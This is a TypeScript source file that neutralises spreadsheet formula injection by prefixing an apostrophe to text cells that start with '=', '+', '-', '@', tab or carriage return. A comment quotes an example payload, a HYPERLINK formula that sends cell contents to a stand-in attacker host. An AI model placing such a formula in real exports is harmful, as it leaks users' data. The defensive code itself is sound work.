/**
 * Spreadsheet formula-injection defence for text cells.
 *
 * A cell whose text begins with `=`, `+`, `-`, `@`, tab or carriage return is
 * interpreted as a formula by Excel, LibreOffice and Google Sheets. AAT lets
 * users supply free text that ends up in exports — run names, memos, tags,
 * poster titles, and the original CSV filename — so any of those could carry
 * something like `=HYPERLINK("https://evil.example/"&A1,"click")` and fire when
 * a colleague opens the workbook.
 *
 * The rule is applied to TEXT cells only. Numeric arrays are written as numbers
 * and must never be routed through here: turning a gravity level into a string
 * would break every downstream formula and chart in the workbook, which is a
 * far worse outcome than the injection it was meant to prevent.
 */

/**
 * Leading characters that make a spreadsheet treat a cell as a formula.
 *
 * `-` is included because `-1+1` is a formula, even though a lone `-5` is just
 * a number. Since this function only ever sees text cells, prefixing is safe.
 */
const FORMULA_LEADERS = new Set(['=', '+', '-', '@', '\t', '\r'])

/**
 * Neutralise a text cell.
 *
 * The apostrophe prefix is the conventional fix: spreadsheets consume it and
 * display the original text, so the visible value is unchanged while the
 * formula interpretation is suppressed.
 */
export function sanitiseTextCell(value: string): string {
  if (value.length === 0) return value
  const first = value[0] as string
  return FORMULA_LEADERS.has(first) ? `'${value}` : value
}

/** True when the value would be interpreted as a formula if written unescaped. */
export function isFormulaLike(value: string): boolean {
  return value.length > 0 && FORMULA_LEADERS.has(value[0] as string)
}
